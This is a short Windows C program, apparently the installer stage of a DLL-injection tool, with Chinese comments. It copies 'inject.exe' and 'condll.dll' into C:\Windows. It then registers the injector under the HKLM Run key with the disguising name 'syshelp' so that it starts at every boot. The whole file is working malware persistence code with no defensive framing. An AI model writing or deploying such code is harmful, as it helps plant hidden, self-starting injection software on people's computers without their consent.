#include <Windows.h>
#include <stdio.h>

#define EXEPATH "C:\\Windows\\inject.exe"
int 
WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPreInst, LPWSTR lpCmdLine, int nCmdShow)
//main()
{
	char currentPath[MAX_PATH] = {0};
	char exePath[MAX_PATH] = {0};
	char dllPath[MAX_PATH] = {0};
	GetCurrentDirectory(MAX_PATH, currentPath);
	sprintf_s(exePath, "%s\\inject.exe", currentPath);
	sprintf_s(dllPath, "%s\\condll.dll", currentPath); 
	//Wow64EnableWow64FsRedirection(FALSE);
	
	//复制注入程序和dll到windows目录下
	int ret1 = CopyFile(exePath, EXEPATH, FALSE);
	int ret2 = CopyFile(dllPath, "C:\\Windows\\condll.dll", FALSE);

	//Wow64EnableWow64FsRedirection(TRUE);

	//程序添加开机自启动
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;
	int ret = RegOpenKey(HKEY_LOCAL_MACHINE, regname, &hKey);    //打开注册表键
	ret = RegSetValueEx(hKey, "syshelp", 0, REG_EXPAND_SZ,
		(unsigned char*)EXEPATH, strlen(EXEPATH)); //设置键值

	if (ret == 0)
	{
		printf("succes to write reg key.\n");
		RegCloseKey(hKey);
	}
	else
	{
		printf("failed to open regedit.%d\n", ret);
		//return 0;
	}

	printf("%s %d\n%s %d\n%d", exePath, ret1, dllPath, ret2, GetLastError());
	//system("pause");
	return 0;
}